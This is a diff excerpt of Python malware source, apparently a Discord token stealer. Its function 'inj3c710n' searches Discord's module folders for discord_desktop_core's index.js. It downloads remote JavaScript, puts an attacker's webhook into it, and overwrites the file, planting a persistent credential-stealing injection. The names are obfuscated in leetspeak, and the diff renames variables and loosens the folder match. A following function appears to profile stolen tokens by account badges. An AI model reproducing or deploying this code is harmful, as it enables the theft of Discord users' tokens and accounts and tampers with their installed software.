@@ -342,21 +342,20 @@ def inj3c710n():
                         if 'modules' in dir:
                             module_path = os.path.join(subdir, dir)
                             for subsubdir, subdirs, subfiles in os.walk(module_path):
-                                if 'discord_desktop_core-1' in subsubdir:
+                                if 'discord_desktop_core-' in subsubdir:
                                     for subsubsubdir, subsubdirs, subsubfiles in os.walk(subsubdir):
                                         if 'discord_desktop_core' in subsubsubdir:
                                             for file in subsubfiles:
                                                 if file == 'index.js':
                                                     file_path = os.path.join(subsubsubdir, file)
 
-                                                    inj3c710n_cont = requests.get(inj3c710n_url).text
+                                                    injeCTmED0cT0r_cont = requests.get(inj3c710n_url).text
 
-                                                    inj3c710n_cont = inj3c710n_cont.replace("%WEBHOOK%", hook)
+                                                    injeCTmED0cT0r_cont = injeCTmED0cT0r_cont.replace("%WEBHOOK%", hook)
 
                                                     with open(file_path, "w", encoding="utf-8") as index_file:
-                                                        index_file.write(inj3c710n_cont)
+                                                        index_file.write(injeCTmED0cT0r_cont)
 inj3c710n()
-
 
 def G37UHQFr13ND5(token):
     badgeList =  [
